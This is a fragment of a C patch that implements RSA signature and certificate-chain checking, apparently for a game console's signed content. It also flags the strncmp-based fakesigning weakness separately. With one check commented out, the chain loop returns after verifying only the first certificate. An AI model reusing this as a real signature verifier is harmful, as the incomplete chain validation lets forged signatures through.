+	memset(correct + 2, 0xff, n - 38);
+	memcpy(correct + n - 36, ber, 16);
+	memcpy(correct + n - 20, h, 20);
+
+	bn_exp(x, sig, key, n, key + n, 4);
+
+	if (memcmp(correct, x, n) == 0)
+		return 0;
+
+	if (strncmp((char*)h, (char*)x+n-20, 20)==0)
+		return -100;
+
+	return -5;
+}
+
+static int check_hash(const u8 *h, const u8 *sig, const u8 *key)
+{
+	u32 type;
+
+	//if (h[0])
+	//	return -400;
+	type = be32(sig) - 0x10000;
+	if (type != be32(key + 0x40))
+		return -6;
+
+	switch (type)
+	{
+	case 1:
+		return check_rsa(h, sig+4, key+0x88, 0x100);
+	}
+
+	return -7;
+}
+
+static const u8* find_cert_in_chain(const u8 *sub, const u8 *cert, const u32 cert_len)
+{
+	char parent[64], *child;
+	u32 sig_len, sub_len;
+	const u8 *p, *issuer;
+
+	strncpy(parent, (char*)sub, sizeof parent);
+	parent[sizeof parent - 1] = 0;
+	child = strrchr(parent, '-');
+	if (child)
+		*child++ = 0;
+	else
+	{
+		*parent = 0;
+		child = (char*)sub;
+	}
+
+	for (p=cert;p<cert+cert_len;p+=sig_len+sub_len)
+	{
+		sig_len = get_sig_len(p);
+		if (sig_len==0)
+			return 0;
+		issuer = p + sig_len;
+		sub_len = get_sub_len(issuer);
+		if (sub_len==0)
+			return 0;
+
+		if (strcmp(parent, (char*)issuer)==0 && strcmp(child, (char*)issuer+0x44)==0)
+			return p;
+	}
+
+	return 0;
+}
+
+int check_cert_chain(const u8 *data, const u32 data_len)
+{
+	const u8* key;
+	const u8 *sig, *sub, *key_cert;
+	u32 sig_len, sub_len;
+	u8 h[20];
+	int ret;
+
+	if (!get_certs())
+		return -1;
+
+	sig = data;
+	sig_len = get_sig_len(sig);
+	if (sig_len==0)
+		return -1;
+
+	sub = data + sig_len;
+	sub_len = data_len - sig_len;
+	if (sub_len==0)
+		return -2;
+
+	for (;;)
+	{
+		if (strcmp((char*)sub, "Root")==0)
+		{
+			key = root_dat;
+			SHA1(sub, sub_len, h);
+			if (be32(sig) != 0x10000)
+				return -8;
+			return check_rsa(h, sig+4, key, 0x200);
+		}
+
+		key_cert = find_cert_in_chain(sub, sys_certs, SYS_CERTS_SIZE);
+		if (key_cert==0)
+			return -3;
+
+		key = key_cert + get_sig_len(key_cert);
+
+		SHA1(sub, sub_len, h);
+		ret = check_hash(h, sig, key);
+		//if (ret)
+			return ret;
+
+		sig = key_cert;
+		sig_len = get_sig_len(sig);
+		if (sig_len==0)
+			return -4;
+		sub = sig + sig_len;
+		sub_len = get_sub_len(sub);
+		if (sub_len==0)
+			return -5;
+	}
+}
+/*********** SIGNATURE CHECKING STUFF ENDS */
